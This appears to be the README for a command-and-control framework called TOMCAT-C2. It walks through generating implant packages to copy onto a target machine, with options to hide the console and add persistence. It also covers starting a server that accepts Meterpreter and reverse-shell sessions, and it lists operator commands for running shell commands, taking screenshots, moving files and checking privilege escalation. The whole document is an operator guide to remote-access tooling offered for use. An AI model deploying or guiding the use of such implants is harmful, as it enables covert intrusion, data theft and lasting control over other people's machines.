<h2 align="left">Installation</h2>

```bash
git clone https://github.com/XTM26/TOMCAT-C2.git
```

<p align="left">Install Dependencies</p>

```bash
pip install -r requirements.txt
```

<h2 align="left">Quick Start</h2>

<p align="left">1. Initialize Certificates (required for mTLS)</p>

```bash
python3 start.py --init-certs
```

Optionally specify the server's public IP so the cert SAN matches:

```bash
python3 start.py --init-certs --server-host 192.168.1.10
```

<p align="left">2. Generate an Agent Package</p>

```bash
python3 start.py --gen-agent myagent --agent-host 192.168.1.10 --agent-port 4444 --agent-mtls
```

<p align="left">This creates `IMPLANT/MYAGENT/` containing:</p>

```
IMPLANT/MYAGENT/
├── tomcatv2a.py      # Pre-configured agent script
├── agent-key.pem
├── agent-cert.pem
├── ca-cert.pem
└── README.txt
```

<p align="left">Copy the entire folder to the target machine and run:</p>

```bash
python3 tomcatv2a.py
```

<p align="left">3. Start The Server</p>
<p align="left">CLI mode (standard TOMCAT only):</p>

```bash
python3 start.py -C
```

<p align="left">CLI mode with mTLS:</p>

```bash
python3 start.py -C -T
```

<p align="left">CLI mode with Meterpreter + mTLS (all protocols):</p>

```bash
python3 start.py -C -M -T
```

<p align="left">Web Panel (default):</p>

```bash
python3 start.py
```

---

<h2 align="left">Command Reference</h2>
<p align="left">`start.py` Flags</p>

| Flag        | Long Form                   | Description                                         |
| ----------- | --------------------------- | --------------------------------------------------- |
| `-i`        | `--init-certs`              | Initialize CA and server certificates               |
| `-a ID`     | `--gen-agent ID`            | Generate agent certificate and package              |
| `-m`        | `--gen-multi-agent`         | Generate multiple agents                            |
| `-c N`      | `--gen-agent-count N`       | Number of agents to generate (default: 10)          |
| `-u PREFIX` | `--gen-agent-prefix PREFIX` | Agent name prefix (default: agent)                  |
| `-l`        | `--list-agents`             | List all issued agent certificates                  |
| `-r ID`     | `--revoke-agent ID`         | Revoke an agent certificate                         |
| `-T`        | `--mtls`                    | Enable mTLS on the server                           |
| `-M`        | `--meterpreter`             | Enable multi-protocol mode (Meterpreter + RevShell) |
| `-w HOST`   | `--host HOST`               | Web panel bind host (default: 0.0.0.0)              |
| `-p PORT`   | `--port PORT`               | Web panel port (default: 5000)                      |
| `-S HOST`   | `--server-host HOST`        | Host embedded in server certificate SAN             |
| `-ah HOST`  | `--agent-host HOST`         | C2 host embedded in generated agent script          |
| `-ap PORT`  | `--agent-port PORT`         | C2 port embedded in generated agent script          |
| `-am`       | `--agent-mtls`              | Enable mTLS in generated agent                      |
| `-hc`       | `--hide-console`            | Hide console window in generated agent (Windows)    |
| `-ps`       | `--persistence`             | Add persistence to generated agent                  |
| `-C`        | `--cli-mode`                | Start with CLI interface                            |
| `-G`        | `--gui-mode`                | Start with Tkinter GUI                              |
| `-W`        | `--web-mode`                | Start with Web Panel (Flask)                        |

<p align="left">CLI Session Commands</p>

| Command           | Description                                           |
| ----------------- | ----------------------------------------------------- |
| `sessions`        | List all active sessions                              |
| `use <id>`        | Enter interactive shell for a session                 |
| `exec <id> <cmd>` | Execute a single command on a session                 |
| `kill <id>`       | Terminate a session                                   |
| `status`          | Show server status and uptime                         |
| `stats`           | Session type breakdown (TOMCAT / Meterpreter / Shell) |
| `logs`            | View recent event log                                 |
| `clear`           | Clear terminal                                        |
| `help`            | Show command reference                                |
| `exit`            | Stop server and quit                                  |

<p align="left">Agent Commands (inside `use <id>`)</p>

| Command                   | Description                              |
| ------------------------- | ---------------------------------------- |
| `sysinfo`                 | Full system information                  |
| `elevate`                 | Check privilege escalation opportunities |
| `screenshot`              | Capture and download a screenshot        |
| `download <path>`         | Download a file from the agent           |
| `upload <local> <remote>` | Upload a file to the agent               |
| `dl <path>`               | Alias for download                       |
| `cd <dir>`                | Change working directory on agent        |
| `stoptask`                | Kill the currently running command       |
| `back`                    | Return to main console                   |
| Any shell command         | Executed via `subprocess` on the target  |

---

<h2 align="left">Certificate Management</h2>

```bash
# Initialize CA + server cert
python3 start.py --init-certs

# Generate single agent package (mTLS enabled)
python3 start.py -a agent01 -ah 10.0.0.1 -ap 4444 -am

# Generate 5 agents with a prefix
python3 start.py -m -c 5 -u op1 -ah 10.0.0.1 -ap 4444 -am

# List all issued agent certs
python3 start.py -l

# Revoke an agent cert
python3 start.py -r agent01
```

<h2 align="left">Certificates are stored in `Certs/`. Agent certificates are stored in `Certs/AgentTCF/`. Metadata (creation dates, paths) is tracked in `Certs/Metadata.json`.</h2>

| Certificate | Validity         |
| ----------- | ---------------- |
| CA          | 10 years         |
| Server      | 1 year           |
| Agent       | 1 year (default) |

---

<h2 align="left">Agent Configuration</h2>

<p align="left">The generated `tomcatv2a.py` has these variables pre-filled by `start.py`:</p>

```python
ServerHost     = "192.168.1.10"
ServerPort     = 4444
UseMTLS        = True
HideConsole    = False
AddPersistence = False
```

<hp align="left">To deploy without mTLS (plain TCP), omit `-am` when generating the agent:</p>

```bash
python3 start.py -a myagent -ah 192.168.1.10 -ap 4444
```

<p align="center">&copy; 2026 XTM26 &amp; G2NTM26SEC</p>
